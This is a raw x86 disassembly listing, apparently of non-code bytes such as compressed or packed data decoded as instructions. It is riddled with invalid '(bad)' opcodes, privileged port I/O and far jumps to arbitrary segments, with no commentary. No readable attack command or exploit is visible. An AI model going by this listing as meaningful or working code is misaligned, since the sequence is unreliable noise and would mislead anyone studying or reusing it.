  420a2e:	out    0xa9,al
  420a30:	push   esi
  420a31:	pop    eax
  420a32:	cmp    cl,BYTE PTR [ecx-0x49bb3da6]
  420a38:	cmp    al,0x5c
  420a3a:	(bad)  
  420a3b:	scas   al,BYTE PTR es:[edi]
  420a3c:	jb     0x420a12
  420a3e:	and    DWORD PTR [eax],edx
  420a40:	fbld   TBYTE PTR [edx]
  420a42:	aaa    
  420a43:	sub    DWORD PTR [ecx],ecx
  420a45:	ja     0x4209fb
  420a47:	scas   al,BYTE PTR es:[edi]
  420a48:	repnz popa 
  420a4a:	js     0x420a4e
  420a4c:	imul   ebx,ebx,0x681985ac
  420a52:	sub    bl,BYTE PTR [edx-0x22]
  420a55:	lods   al,BYTE PTR ds:[esi]
  420a56:	lods   eax,DWORD PTR ds:[esi]
  420a57:	pop    edi
  420a58:	aam    0x3f
  420a5a:	xchg   esi,eax
  420a5b:	sahf   
  420a5c:	in     al,0xfe
  420a5e:	xchg   BYTE PTR [esi],al
  420a60:	in     eax,dx
  420a61:	mov    eax,0xfe54d264
  420a66:	mov    ecx,0x7a65bcbc
  420a6b:	pop    es
  420a6c:	sub    eax,0x603b388d
  420a71:	les    edi,FWORD PTR [ecx-0x12ec7918]
  420a77:	push   esi
  420a78:	jno    0x420a98
  420a7a:	call   0xc1a1:0x2d988703
  420a81:	sub    eax,DWORD PTR [ebx+0x17c6fb3a]
  420a87:	into   
  420a88:	(bad)  
  420a8a:	pop    ds
  420a8b:	(bad)  
  420a8c:	jmp    0x420a68
  420a8e:	pop    ebx
  420a8f:	call   DWORD PTR [ecx-0x34]
  420a92:	sti    
  420a93:	jl     0x420a51
  420a95:	out    dx,eax
  420a96:	add    ah,al
  420a98:	clc    
  420a99:	fstp   TBYTE PTR [edi-0x5b]
  420a9c:	mov    ds:0xfd3fe37e,al
  420aa1:	xchg   edx,eax
  420aa2:	push   edi
  420aa3:	and    DWORD PTR [edi],ecx
  420aa5:	lds    ecx,FWORD PTR [ecx]
  420aa7:	in     al,0x14
  420aa9:	sbb    edx,DWORD PTR [eax]
  420aab:	jb     0x420a35
  420aad:	in     al,0x32
  420aaf:	mov    gs,ebx
  420ab1:	sub    edx,DWORD PTR [eax+0x6e61acb8]
  420ab7:	mov    bh,0x93
  420ab9:	lods   al,BYTE PTR ds:[esi]
  420aba:	xor    BYTE PTR [edx+0x362d990b],dh
  420ac0:	jbe    0x420ad9
  420ac2:	(bad)  
  420ac5:	test   eax,0xb682835c
  420aca:	out    dx,eax
  420acb:	mov    ebp,0x6f0da0c8
  420ad0:	je     0x420a8f
  420ad2:	icebp  
  420ad3:	or     al,0x84
  420ad5:	cmp    al,0x87
  420ad7:	pusha  
  420ad8:	and    dl,bh
  420ada:	cld    
  420adb:	adc    al,0x74
  420add:	test   DWORD PTR [ecx],esp
  420adf:	mov    esi,edi
  420ae1:	push   ds
  420ae2:	enter  0x763b,0xc8
  420ae6:	clc    
  420ae7:	add    eax,0xbd33928e
  420aec:	jne    0x420b4e
  420aee:	mov    cl,BYTE PTR [ecx]
  420af0:	loope  0x420b22
  420af2:	mov    edi,0x43001ad
  420af7:	sub    eax,0x91848f1d
  420afc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420afd:	fldcw  WORD PTR [eax+0xceb97cc]
  420b03:	adc    eax,edx
  420b05:	xchg   esp,eax
  420b06:	out    0x17,al
  420b08:	ret    0x5688
  420b0b:	xor    cl,al
  420b0d:	dec    eax
  420b0e:	jmp    0x420b42
  420b10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b11:	mov    al,0x7d
  420b13:	add    al,BYTE PTR [ecx+eax*8+0x6aed015d]
  420b1a:	gs stos DWORD PTR es:[edi],eax
  420b1c:	sbb    DWORD PTR [ebp-0x7727ffa4],edi
  420b22:	push   es
  420b23:	scas   eax,DWORD PTR es:[edi]
  420b24:	push   0xc55f9971
  420b29:	dec    eax
  420b2a:	push   esi
  420b2b:	pushf  
  420b2c:	sub    esp,DWORD PTR [esp]
  420b2f:	add    ah,ah
  420b31:	push   esi
  420b32:	jns    0x420b8e
  420b34:	cmp    ebx,DWORD PTR [edi-0x20a4042f]
  420b3a:	test   BYTE PTR [ebx-0x53],dh
  420b3d:	int    0xbb
  420b3f:	pop    ss
  420b40:	test   BYTE PTR [ebp+0xd247d34],ah
  420b46:	sub    eax,0x95be65ac
  420b4b:	stc    
  420b4c:	fdiv   QWORD PTR [esi-0x76]
  420b4f:	xor    dh,bl
  420b51:	adc    al,0x8c
  420b53:	in     eax,0xef
  420b55:	push   0x79
  420b57:	push   edi
  420b58:	sbb    BYTE PTR [ecx],bh
  420b5a:	retf   
  420b5b:	(bad)  
  420b5c:	sub    esi,edi
  420b5e:	sbb    DWORD PTR [ebx-0x45],ebp
  420b61:	fdiv   st,st(4)
  420b65:	jb     0x420b36
  420b67:	jns    0x420bd0
  420b69:	cdq    
  420b6a:	imul   eax,DWORD PTR [ecx+0x3e],0x38
  420b6e:	repz or BYTE PTR [ecx-0x78],bh
  420b72:	fwait
  420b73:	cld    
  420b74:	pop    edx
  420b75:	jmp    0x420bce
  420b77:	xchg   ecx,eax
  420b78:	imul   eax,esp,0xfffffff4
  420b7b:	imul   ebp,DWORD PTR [ebp+edi*2+0x5feced3c],0x3ef21e03
  420b86:	pop    ds
  420b87:	out    dx,eax
  420b88:	mov    ebx,0x7d9ec800
  420b8d:	std    
  420b8e:	xchg   ebx,eax
  420b8f:	inc    ecx
  420b90:	jbe    0x420b50
  420b92:	and    dh,BYTE PTR [esi-0x63]
  420b95:	std    
  420b96:	fdiv   st(4),st
  420b98:	arpl   WORD PTR [ecx+0x759a10d4],cx
  420b9e:	mov    al,0xd8
  420ba0:	xchg   ebx,eax
  420ba1:	sbb    al,0x82
  420ba3:	rcr    BYTE PTR [edi+esi*8+0x5812b42a],0x25
  420bab:	add    BYTE PTR [ebp+0x16],0x5f
  420baf:	add    al,0x8e
  420bb1:	sti    
  420bb2:	push   eax
  420bb3:	pop    ecx
  420bb4:	pop    esp
  420bb5:	out    0x5e,eax
  420bb7:	pop    esi
  420bb8:	mov    al,ds:0x74dc6121
  420bbd:	or     ch,cl
  420bbf:	fadd   QWORD PTR [edi-0x5c]
  420bc2:	jne    0x420c36
  420bc4:	scas   al,BYTE PTR es:[edi]
  420bc5:	out    dx,eax
  420bc6:	adc    eax,0xe4edc9d4
  420bcb:	fadd   st,st(0)
  420bcd:	push   esp
  420bce:	mov    ecx,0x441244b7
  420bd3:	xchg   ebx,eax
  420bd4:	sbb    esp,DWORD PTR [esi+0x52]
  420bd7:	mov    eax,ds:0xccf256be
  420bdc:	sbb    DWORD PTR [edx],edi
  420bde:	push   0x60945180
  420be3:	aaa    
  420be4:	dec    eax
  420be5:	dec    ecx
  420be6:	pop    esi
  420be7:	cmp    edi,eax
  420be9:	jne    0x420bab
  420beb:	inc    ecx
  420bec:	mov    ds,WORD PTR [esp+ebx*1-0x4420dcff]
  420bf3:	add    cl,0x4d
  420bf6:	push   ebx
  420bf7:	jbe    0x420be0
  420bf9:	fisub  DWORD PTR [edx]
  420bfb:	pop    es
  420bfc:	in     eax,0xfc
  420bfe:	sub    eax,0xb761ec04
  420c03:	xlat   BYTE PTR ds:[ebx]
  420c04:	jb     0x420c79
  420c06:	sbb    esp,ebp
  420c08:	jecxz  0x420c66
  420c0a:	lods   eax,DWORD PTR ds:[esi]
  420c0b:	sub    ecx,DWORD PTR [esi+ebp*8+0x22]
  420c0f:	sub    al,0x87
  420c11:	stc    
  420c12:	(bad)  
  420c14:	push   edi
  420c15:	dec    edi
  420c16:	cli    
  420c17:	xor    eax,0x6dfcaffa
  420c1c:	test   BYTE PTR [eax-0x1a],al
  420c1f:	mov    es,WORD PTR [ebx+0x7e]
  420c22:	pop    ss
  420c23:	pop    ebx
  420c24:	lds    esi,FWORD PTR [ebx]
  420c26:	sbb    bh,0x65
  420c29:	sbb    al,0x3f
  420c2b:	pop    ds
  420c2c:	dec    ebx
  420c2d:	jl     0x420c91
  420c2f:	(bad)  
  420c30:	enter  0xe0d5,0xce
  420c34:	(bad)  
  420c35:	cwde   
  420c36:	and    BYTE PTR [esi+0x9],bl
  420c39:	push   esp
  420c3a:	sar    DWORD PTR [ecx],1
  420c3c:	inc    edi
  420c3d:	call   0xe631d965
  420c42:	or     cl,BYTE PTR [edi+0x5]
  420c45:	fidiv  DWORD PTR [edi+0x55a1d0e2]
  420c4b:	cmp    ah,ah
  420c4d:	iret   
  420c4e:	add    esi,edx
  420c50:	mov    ebp,0xb9477c11
  420c55:	sbb    esp,eax
  420c57:	loop   0x420bfb
  420c59:	adc    eax,0x7c675cfb
  420c5e:	scas   al,BYTE PTR es:[edi]
  420c5f:	ret    0x83f0
  420c62:	les    ecx,FWORD PTR [edi-0x34148189]
  420c68:	cld    
  420c69:	inc    ecx
  420c6a:	adc    BYTE PTR [eax],al
  420c6c:	in     al,dx
  420c6d:	jge    0x420c54
  420c6f:	retf   
  420c70:	inc    ecx
  420c71:	xor    al,0xd4
  420c73:	je     0x420c96
  420c75:	sbb    dl,cl
  420c77:	rcl    DWORD PTR [eax+eax*4],1
  420c7a:	lea    edi,[edi-0x4a907275]
  420c80:	mov    esi,0x4c48802c
  420c85:	pop    esi
  420c86:	cdq    
  420c87:	pop    eax
  420c88:	jb     0x420c6c
  420c8a:	mov    bl,0x87
  420c8c:	jnp    0x420cdd
  420c8e:	inc    edi
  420c8f:	adc    BYTE PTR [esi+ecx*4+0x14],ah
  420c93:	mov    bh,0x97
  420c95:	cmp    ebp,DWORD PTR [eax-0x3f]
  420c98:	sub    eax,DWORD PTR [ebx+0x5ad7e76a]
  420c9e:	mov    ds:0x34a58d11,al
  420ca3:	or     cl,BYTE PTR [eax+0x14]
  420ca6:	mov    edx,0xc6694478
  420cab:	into   
  420cac:	xor    cl,BYTE PTR [ebp+0x54]
  420caf:	mov    edx,DWORD PTR ss:[eax]
  420cb2:	inc    eax
  420cb3:	loop   0x420ca4
  420cb5:	scas   al,BYTE PTR es:[edi]
  420cb6:	pop    ds
  420cb7:	inc    eax
  420cb8:	imul   eax,DWORD PTR [edx+0x1da41157],0xd6c9e246
  420cc2:	loope  0x420c5a
  420cc4:	jmp    0xc8686ff9
  420cc9:	ror    BYTE PTR [eax],0x11
  420ccc:	mov    cl,0x35
  420cce:	add    eax,0x3a19a441
  420cd3:	inc    edi
  420cd4:	and    cl,bl
  420cd6:	scas   eax,DWORD PTR es:[edi]
  420cd7:	ja     0x420cc8
  420cd9:	popa   
  420cda:	dec    ebp
  420cdb:	sbb    bl,dh
  420cdd:	mov    es,WORD PTR [edx]
  420cdf:	aad    0x7d
  420ce1:	(bad)  
  420ce2:	adc    DWORD PTR [ebx+0x2e0d55eb],edx
  420ce8:	xchg   ebx,eax
  420ce9:	and    ebx,DWORD PTR [esi-0x461a4489]
  420cef:	xchg   edi,eax
  420cf0:	fisttp WORD PTR [ebx-0x32]
  420cf3:	repz inc edx
  420cf5:	inc    edi
  420cf6:	xor    BYTE PTR [ebx],bl
  420cf8:	inc    esi
  420cf9:	xchg   edi,eax
  420cfa:	jnp    0x420cb6
  420cfc:	lods   eax,DWORD PTR ds:[esi]
  420cfd:	fdiv   QWORD PTR [edx]
  420cff:	inc    edi
  420d00:	mov    bl,0xbb
  420d02:	mov    WORD PTR ds:0xd18cb34e,fs
  420d08:	imul   ebp,DWORD PTR [ebp+0x367597b6],0x7b
  420d0f:	repz lea esp,[edi+ebp*2+0x6]
  420d14:	stc    
  420d15:	cld    
  420d16:	fs jge 0x420cc6
  420d19:	stc    
  420d1a:	mov    bl,0x1
  420d1c:	mov    ecx,0x2011c7bf
  420d21:	ss inc ebx
  420d23:	sar    DWORD PTR [eax-0x1f],1
  420d26:	std    
  420d27:	stos   BYTE PTR es:[edi],al
  420d28:	mov    ecx,0x399fce3e
  420d2d:	bound  eax,QWORD PTR [edx]
  420d2f:	cld    
  420d30:	xor    DWORD PTR cs:[ebx+ecx*2-0x75],edi
  420d35:	into   
  420d36:	sbb    al,0xbd
  420d38:	jmp    0x8e8d:0x9f0575ac
  420d3f:	sbb    BYTE PTR [edx],bl
  420d41:	mov    cl,0x28
  420d43:	dec    esp
  420d44:	faddp  st(3),st
  420d46:	adc    eax,0x364e51a0
  420d4b:	and    ch,BYTE PTR [esp+edi*8]
  420d4e:	bound  eax,QWORD PTR [esi+0x52fb3c37]
  420d54:	repz sub edi,edi
  420d57:	icebp  
  420d58:	pop    edi
  420d59:	sbb    al,0xfb
  420d5b:	int3   
  420d5c:	lahf   
  420d5d:	ja     0x420dd0
  420d5f:	fcomip st,st(7)
  420d61:	cld    
  420d62:	js     0x420dc3
  420d64:	add    eax,0xfa3fe9c0
  420d69:	repz add edi,esi
  420d6c:	(bad)  
  420d6d:	rcl    BYTE PTR [edi+0x152e62bc],cl
  420d73:	pop    ebp
  420d74:	inc    edi
  420d75:	mov    WORD PTR [edx+0x33671d91],es
  420d7b:	test   DWORD PTR [ebp-0x12],esi
  420d7e:	loope  0x420dac
  420d80:	or     BYTE PTR [esp+esi*4+0x68],0x6d
  420d85:	or     ecx,DWORD PTR [ebp+0x1d]
  420d88:	mov    DWORD PTR [edx],ebp
  420d8a:	fisttp WORD PTR [ebp-0x64a8cfc0]
  420d90:	mov    BYTE PTR [edi-0x1e498e40],bl
  420d96:	pushf  
  420d97:	out    0x97,eax
  420d99:	and    BYTE PTR ds:0x391509b,ch
  420d9f:	pop    ebx
  420da0:	inc    edi
  420da1:	mov    al,ds:0xc7590fa2
  420da6:	fcomp  DWORD PTR [eax-0x4fd6dcba]
  420dac:	ror    BYTE PTR [ebp-0x44],1
  420daf:	shl    BYTE PTR [ebx],1
  420db1:	sbb    al,BYTE PTR [esi-0xe]
  420db4:	or     dh,BYTE PTR [edx]
  420db6:	out    0xd9,eax
  420db8:	and    eax,0x8b29974
  420dbd:	push   es
  420dbe:	inc    ebx
  420dbf:	lock mov dh,0xc8
  420dc2:	dec    ecx
  420dc3:	add    al,0x96
  420dc5:	cdq    
  420dc6:	pop    ds
  420dc7:	sub    edx,0xf8964842
  420dcd:	mov    bl,0x5c
  420dcf:	nop
  420dd0:	repnz outs dx,BYTE PTR fs:[esi]
  420dd3:	repnz call 0xca51:0xafc83422
  420ddb:	shl    DWORD PTR [esi+0x72],1
  420dde:	scas   al,BYTE PTR es:[edi]
  420ddf:	lahf   
  420de0:	pop    ecx
  420de2:	out    0x5f,al
  420de4:	inc    eax
  420de5:	push   cs
  420de6:	shl    DWORD PTR [ecx+0x4],cl
  420de9:	test   BYTE PTR [eax],dl
  420deb:	xor    DWORD PTR [esp+ebp*4+0x79fa75a3],ecx
  420df2:	push   cs
  420df3:	rcr    DWORD PTR [ebx+0x3c6f49fb],0xf1
  420dfa:	sbb    BYTE PTR [ebx+0x7f],0x89
  420dfe:	(bad)  
  420e00:	or     BYTE PTR [edx],dh
  420e02:	aaa    
  420e03:	fwait
  420e04:	push   ebx
  420e05:	sbb    BYTE PTR [edi],ah
  420e07:	cmp    DWORD PTR [ecx+edx*1],0x4c
  420e0b:	sbb    al,0xb9
  420e0d:	or     DWORD PTR [esi+eiz*4+0x31],esp
  420e11:	dec    ebx
  420e12:	rol    bl,cl
  420e14:	(bad)  
  420e15:	dec    esi
  420e16:	pop    eax
  420e17:	lahf   
  420e18:	dec    edi
  420e19:	inc    eax
  420e1a:	fimul  WORD PTR [ecx-0x28]
  420e1d:	popa   
  420e1e:	xor    al,0x64
  420e20:	pop    eax
  420e21:	gs repz push ebp
  420e24:	cwde   
  420e25:	rcr    DWORD PTR [esi+0x4f664c5b],cl
  420e2b:	je     0x420dc1
  420e2d:	into   
  420e2e:	enter  0x18ef,0xba
  420e32:	adc    BYTE PTR [ebp+0x26],ah
  420e35:	add    al,BYTE PTR [esi-0x3a]
  420e38:	es iret 
  420e3a:	or     esi,DWORD PTR [ecx-0x33d4df82]
  420e40:	mov    WORD PTR [edi+0x31af7323],ds
  420e46:	arpl   sp,si
  420e48:	sbb    al,0xc5
  420e4a:	xchg   edi,eax
  420e4b:	add    eax,0x7fd6b5e0
  420e50:	and    BYTE PTR [ebx-0x49fba624],ch
  420e56:	jns    0x420e77
  420e58:	(bad)  
  420e59:	not    DWORD PTR [ebp+0x0]
  420e5c:	fs stos BYTE PTR es:[edi],al
  420e5e:	inc    DWORD PTR [esi-0x68]
  420e61:	out    dx,al
  420e62:	(bad)  
  420e64:	test   BYTE PTR [ecx],ah
  420e66:	add    al,0xe
  420e68:	or     al,BYTE PTR [ebx-0x47]
  420e6b:	mov    dh,0x9d
  420e6d:	jb     0x420e8f
  420e6f:	push   ss
  420e70:	mov    esp,es
  420e72:	jmp    0x420ee1
  420e74:	cmp    BYTE PTR [edi],cl
  420e76:	xor    esi,ecx
  420e78:	push   ds
  420e79:	cmp    al,BYTE PTR [esp+eiz*8]
  420e7c:	sub    al,0xcc
  420e7e:	stos   DWORD PTR es:[edi],eax
  420e7f:	jo     0x420ed2
  420e81:	push   cs
  420e82:	stos   DWORD PTR es:[edi],eax
  420e83:	gs inc ebp
  420e85:	repz cmp DWORD PTR [esi-0x5a],esi
  420e89:	or     BYTE PTR [ecx],bl
  420e8b:	xchg   esp,eax
  420e8c:	bound  edi,QWORD PTR es:[edi+0x11d0d906]
  420e93:	cmp    ch,BYTE PTR [esi-0x3fb7ca14]
  420e99:	outs   dx,BYTE PTR ds:[esi]
  420e9a:	adc    dl,BYTE PTR [edx+0x5052a602]
  420ea0:	cdq    
  420ea1:	in     al,dx
  420ea2:	mov    dl,0xb4
  420ea4:	arpl   WORD PTR [eax+0x6884303e],cx
  420eaa:	sbb    bh,al
  420eac:	mov    ebx,DWORD PTR [ecx+eiz*8]
  420eaf:	daa    
  420eb0:	call   0x11c492fb
  420eb5:	or     al,0x8a
  420eb7:	cld    
  420eb8:	popf   
  420eb9:	add    al,0xe
  420ebb:	or     bh,dl
  420ebd:	mov    cl,0xc
  420ebf:	stos   DWORD PTR es:[edi],eax
  420ec0:	jb     0x420e8f
  420ec2:	gs sub esi,esi
  420ec5:	int3   
  420ec6:	stc    
  420ec7:	mov    dh,0x8a
  420ec9:	dec    ebp
  420eca:	adc    BYTE PTR [ebp-0x66],cl
  420ecd:	mov    edi,0xccab10a3
  420ed2:	adc    DWORD PTR ds:0xa8f9cea8,0x9bb42251
  420edc:	mov    ch,0xbc
  420ede:	bound  esi,QWORD PTR [edx]
  420ee0:	pop    eax
  420ee1:	fistp  DWORD PTR [edi-0x4c]
  420ee4:	mov    esi,0x2751c57a
  420ee9:	sbb    cl,dh
  420eeb:	call   FWORD PTR [ebp-0x2]
  420eee:	jbe    0x420f09
  420ef0:	dec    edx
  420ef1:	ficomp WORD PTR [ecx]
  420ef3:	jb     0x420f50
  420ef5:	fist   DWORD PTR ds:0x4ce0226e
  420efb:	in     eax,0x66
  420efd:	push   ss
  420efe:	out    0x63,eax
  420f00:	adc    eax,0x344e23b4
  420f05:	jmp    0x420e8b
  420f07:	jae    0x420e8d
  420f09:	pushf  
  420f0a:	jge    0x420e9a
  420f0c:	sbb    esp,DWORD PTR fs:[edx-0x4c]
  420f10:	mov    edi,0x89a61e71
  420f15:	inc    ebx
  420f16:	push   ebx
  420f17:	scas   al,BYTE PTR es:[edi]
  420f18:	xchg   di,ax
  420f1a:	jnp    0x420f64
  420f1c:	hlt    
  420f1d:	rol    BYTE PTR [ebp-0x4742f116],0x8
  420f24:	xchg   ecx,eax
  420f25:	aam    0xdc
  420f27:	xlat   BYTE PTR ds:[ebx]
  420f28:	dec    ecx
  420f29:	out    dx,eax
  420f2a:	and    eax,0xb048e333
  420f2f:	popa   
  420f30:	dec    ebp
  420f31:	pop    esp
  420f32:	mov    edi,0x15821397
  420f37:	in     eax,0xe7
  420f39:	cmp    cl,BYTE PTR ds:0x895bb0fd
  420f3f:	mov    bh,0x7e
  420f41:	test   BYTE PTR [ebx+0x3ef0cfc0],0x1e
  420f48:	out    dx,eax
  420f49:	scas   eax,DWORD PTR es:[edi]
  420f4a:	or     DWORD PTR [eax+0xb1fedff],esi
  420f50:	cld    
  420f51:	inc    ecx
  420f52:	mov    al,ds:0xf21ecf24
  420f57:	push   ebp
  420f58:	xchg   edi,eax
  420f59:	or     esi,esi
  420f5b:	repz lds edx,FWORD PTR [ebp+0x3e8eb789]
  420f62:	mov    ebp,ebx
  420f64:	mov    dh,BYTE PTR [edi+edx*1-0x53]
  420f68:	and    esp,ecx
  420f6a:	and    bl,0x90
  420f6d:	xchg   ecx,eax
  420f6e:	ret    
  420f6f:	test   ebp,edi
  420f71:	push   edx
  420f72:	fucom  st(5)
  420f74:	inc    eax
  420f75:	dec    ebx
  420f76:	sbb    ebp,DWORD PTR [esi+0x33]
  420f79:	dec    esp
  420f7a:	popa   
  420f7b:	imul   ebp,ebx,0xffffff95
  420f7e:	jbe    0x420f86
  420f80:	mov    ah,BYTE PTR [ebx]
  420f82:	rol    BYTE PTR [esi-0x44a5faf3],cl
  420f88:	les    eax,FWORD PTR [ecx]
  420f8a:	mov    ds:0xe7f205be,eax
  420f8f:	sub    bh,cl
  420f91:	inc    esp
  420f92:	adc    al,0x9c
  420f94:	xor    DWORD PTR [ebp-0x39fbbcbd],esp
  420f9a:	push   fs
  420f9c:	and    al,BYTE PTR [esi-0x3e]
  420f9f:	inc    ebp
  420fa0:	xchg   esi,eax
  420fa1:	fadd   DWORD PTR [eax+edi*4-0x667561fc]
  420fa8:	nop
  420fa9:	in     eax,0xf7
  420fab:	retf   
  420fac:	(bad)
  420fb0:	jmp    FWORD PTR [ebx+ecx*8]
  420fb3:	sbb    eax,0x126e4087
  420fb8:	mov    eax,0xa157d64e
  420fbd:	mov    cl,0xf3
  420fbf:	outs   dx,BYTE PTR ds:[esi]
  420fc0:	scas   al,BYTE PTR es:[edi]
  420fc1:	mov    ds:0x6c5b0f0f,eax
  420fc6:	jecxz  0x421029
  420fc8:	fiadd  WORD PTR [edi-0x34]
  420fcb:	mov    BYTE PTR [edi+0x7d],dl
  420fce:	or     BYTE PTR [edx],ch
  420fd0:	jg     0x421001
  420fd2:	sub    eax,DWORD PTR [edi+0x5c]
  420fd5:	mov    BYTE PTR [ebx-0xe],ch
  420fd8:	out    dx,eax
  420fd9:	lods   eax,DWORD PTR ds:[esi]
  420fda:	push   es
  420fdb:	xchg   ebp,eax
  420fdc:	pop    ds
  420fdd:	ror    BYTE PTR [eax],1
  420fdf:	sub    BYTE PTR [ecx],ah
  420fe1:	out    dx,eax
  420fe2:	repnz xor al,0xd4
  420fe5:	xlat   BYTE PTR ds:[ebx]
  420fe6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420fe7:	ret    
  420fe8:	shl    DWORD PTR [ecx-0x52920736],1
  420fee:	or     edx,0x5
  420ff1:	jecxz  0x42106a
  420ff3:	int    0xbf
  420ff5:	js     0x420fce
  420ff7:	or     eax,0xbfd8d80d
  420ffc:	push   0xbbfe72d9
  421001:	xor    eax,0x83851d11
  421006:	retf   0x13a3
  421009:	jbe    0x420fa9
  42100b:	and    al,0x6d
  42100d:	fiadd  DWORD PTR [ecx-0x56]
  421010:	scas   eax,DWORD PTR es:[edi]
  421011:	scas   al,BYTE PTR es:[edi]
  421012:	mov    ebp,0x18332e84
  421017:	imul   edx,DWORD PTR [esi],0xd9da14a2
  42101d:	dec    ebx
  42101e:	(bad)  
  42101f:	cs pop esi
  421021:	pusha  
  421022:	out    0xd6,al
  421024:	int3   
  421025:	lds    ecx,FWORD PTR [eax+0x33c393a2]
  42102b:	xchg   ecx,eax
  42102c:	mov    ah,BYTE PTR [ecx-0x19]
  42102f:	inc    edi
  421030:	stc    
  421031:	out    0x55,eax
  421033:	add    BYTE PTR [ebp+ebx*8+0x7d9545fd],bl
  42103a:	in     eax,dx
  42103b:	mov    edi,0x245f82fa
  421040:	mul    DWORD PTR [edx-0x65465d36]
  421046:	pop    ebp
  421047:	mov    al,ds:0xed8523aa
  42104c:	in     al,0x3b
  42104e:	xchg   edx,eax
  42104f:	xlat   BYTE PTR ds:[ebx]
  421050:	push   0x4e
  421052:	xchg   ecx,eax
  421053:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421054:	repnz xchg ebp,eax
  421056:	inc    edi
  421057:	ficom  WORD PTR [edx-0x14]
  42105a:	adc    eax,0xc81cad49
  42105f:	jmp    0xe49f079e
  421064:	push   es
  421065:	mov    es,eax
  421067:	lock shr DWORD PTR [ebx+0x5dedbffe],0x5d
  42106f:	scas   eax,DWORD PTR es:[edi]
  421070:	fs inc edi
  421072:	jne    0x4210d1
  421074:	push   ebp
  421075:	out    0xf4,eax
  421077:	popf   
  421078:	jnp    0x421061
  42107a:	mov    gs,edi
  42107c:	js     0x421044
  42107e:	mov    WORD PTR [ecx],fs
  421080:	push   esi
  421081:	pushf  
  421082:	enter  0x8022,0x40
  421086:	push   ss
  421087:	pop    edi
  421088:	and    dl,BYTE PTR [ecx+0x8cb0915]
  42108e:	xor    BYTE PTR [edx+0x1e],dl
  421091:	repnz xchg esp,eax
  421093:	inc    edi
  421094:	inc    BYTE PTR [eax]
  421096:	push   ecx
  421097:	clc    
  421098:	add    edi,DWORD PTR [ecx+esi*8+0xf02220f]
  42109f:	mov    BYTE PTR [edi],dh
  4210a1:	and    al,0x78
  4210a3:	add    al,0xe5
  4210a5:	and    DWORD PTR [edx+0x2],eax
  4210a8:	or     DWORD PTR [ecx-0x7ed7ef7c],eax
  4210ae:	jns    0x421093
  4210b0:	or     al,0x0
  4210b2:	add    BYTE PTR [ebx*1+0x54414449],dl
  4210b9:	inc    ecx
  4210ba:	inc    ecx
  4210bb:	and    al,0x80
  4210bd:	push   es
  4210be:	sbb    al,0x4c
  4210c0:	ins    BYTE PTR es:[edi],dx
  4210c1:	(bad)  
  4210c2:	arpl   dx,ax
  4210c4:	js     0x4210b4
  4210c6:	jl     0x4210be
  4210c8:	std    
  4210c9:	jmp    0xaed7:0xb387953e
  4210d0:	push   ebp
  4210d1:	mov    ebx,0xee160f4f
  4210d6:	sub    edx,DWORD PTR [ecx]
  4210d8:	shl    DWORD PTR ds:0xe7dddbdd,1
  4210de:	aam    0xa9
  4210e0:	(bad)  
  4210e1:	pop    ebp
  4210e2:	jnp    0x421093
  4210e4:	mov    ebp,0xcb00f3ea
  4210e9:	(bad)  ds:0x19206f39
  4210ef:	jnp    0x421159
  4210f1:	inc    esi
  4210f2:	mov    ah,0xe9
  4210f4:	in     eax,0x84
  4210f6:	xor    eax,0x59bee734
  4210fb:	rol    BYTE PTR [ebx-0x569c79c0],1
  421101:	or     edi,DWORD PTR ds:0xd6a51641
  421107:	mov    bl,0x12
  421109:	and    BYTE PTR [ebp-0xd57efdb],al
  42110f:	das    
  421110:	fld    TBYTE PTR [ebx-0x16]
  421113:	mov    ecx,0xef052cf4
  421118:	jnp    0x4210cd
  42111a:	push   ds
  42111b:	add    cl,BYTE PTR [esi]
  42111d:	sahf   
  42111e:	xchg   edi,eax
  42111f:	sbb    DWORD PTR [edx-0x17],ebp
  421122:	in     al,0x3d
  421124:	or     BYTE PTR [ecx+0x44d9ac1e],ch
  42112a:	push   esi
  42112b:	outs   dx,DWORD PTR ds:[esi]
  42112c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42112d:	fimul  WORD PTR [ebx+0x3769732]
  421133:	out    0xd3,eax
  421135:	stc    
  421136:	ror    BYTE PTR [edi],cl
  421138:	pop    ebx
  421139:	popa   
  42113a:	jmp    0x5b8c4e2a
  42113f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421140:	xchg   cx,ax
  421142:	mov    WORD PTR [ecx],es
  421144:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421145:	es pop ecx
  421147:	mov    edi,0x7ca07b08
  42114c:	in     al,dx
  42114d:	sbb    dl,bh
  42114f:	fnstcw WORD PTR [ebx]
  421151:	rcr    DWORD PTR [edx-0xa70c727],cl
  421157:	int    0x9d
  421159:	sbb    DWORD PTR [ecx],esp
  42115b:	mov    ah,0x95
  42115d:	add    bh,BYTE PTR [edi-0x438df3f4]
  421163:	mov    ds:0xa9207409,al
  421168:	(bad)  
  421169:	cmc    
  42116a:	mov    ah,0x7a
  42116c:	aam    0x73
  42116e:	fsubr  DWORD PTR cs:[ebp+0x13f69d32]
  421175:	scas   eax,DWORD PTR es:[edi]
  421176:	push   eax
  421177:	rol    edx,0xf3
  42117a:	data16 jle 0x4211b8
  42117d:	inc    eax
  42117e:	mov    esi,0xce8fd3fb
  421183:	pop    edi
  421184:	cld    
  421185:	(bad)  
  421186:	xchg   ebp,eax
  421187:	mov    ecx,DWORD PTR [edi+0x7d]
  42118a:	cld    
  42118b:	xor    BYTE PTR [esi-0x43],ah
  42118e:	test   eax,0xe00c7e70
  421193:	clc    
  421194:	(bad)  
  421195:	push   ebx
  421196:	(bad)  
  421198:	cmc    
  421199:	mov    edi,0x78d157ca
  42119e:	or     al,0x88
  4211a0:	xor    BYTE PTR [edx],0x24
  4211a3:	mov    al,ds:0xfe91e66e
  4211a8:	jg     0x421188
  4211aa:	adc    edi,ebp
  4211ac:	pusha  
  4211ad:	push   esp
  4211ae:	into   
  4211af:	sub    DWORD PTR ds:0x686f0e2,0xffffffda
  4211b6:	sbb    DWORD PTR [ebx],0x7e86c831
  4211bc:	inc    ecx
  4211bd:	adc    al,0x97
  4211bf:	sub    eax,0x6ebdea9a
  4211c4:	(bad)  
  4211c6:	clc    
  4211c7:	sbb    al,0x84
  4211c9:	jmp    0x421235
  4211cb:	mov    ecx,0x57d11074
  4211d0:	ja     0x4211f7
  4211d2:	xor    al,0xb4
  4211d4:	dec    edi
